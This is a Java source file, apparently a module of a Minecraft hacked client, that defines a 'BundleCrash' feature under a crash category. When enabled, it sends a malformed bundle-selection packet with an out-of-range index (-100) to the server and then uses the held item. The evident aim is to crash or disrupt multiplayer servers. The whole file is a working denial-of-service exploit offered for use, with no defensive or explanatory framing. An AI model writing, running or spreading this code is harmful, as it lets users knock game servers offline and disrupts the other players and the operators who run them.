package thunder.hack.features.modules.crash;

import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.BundleContentsComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.BundleItemSelectedC2SPacket;
import net.minecraft.util.Hand;
import thunder.hack.features.modules.Module;

public class BundleCrash extends Module {
    public BundleCrash() {
        super("BundleCrash", Category.CRASH);
    }

    @Override
    public void onEnable() {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            disable();
            return;
        }

        ItemStack stack = mc.player.getMainHandStack();
        BundleContentsComponent contents = stack.get(DataComponentTypes.BUNDLE_CONTENTS);

        if (contents != null && !contents.isEmpty()) {
            int slotIdx = mc.player.getInventory().selectedSlot + 36;
            mc.getNetworkHandler().sendPacket(new BundleItemSelectedC2SPacket(slotIdx, -100));
            if (mc.interactionManager != null) {
                mc.interactionManager.interactItem(mc.player, Hand.MAIN_HAND);
            }
        } else {
            sendMessage("Hold a bundle with at least one item in your hotbar");
        }

        disable();
    }
}
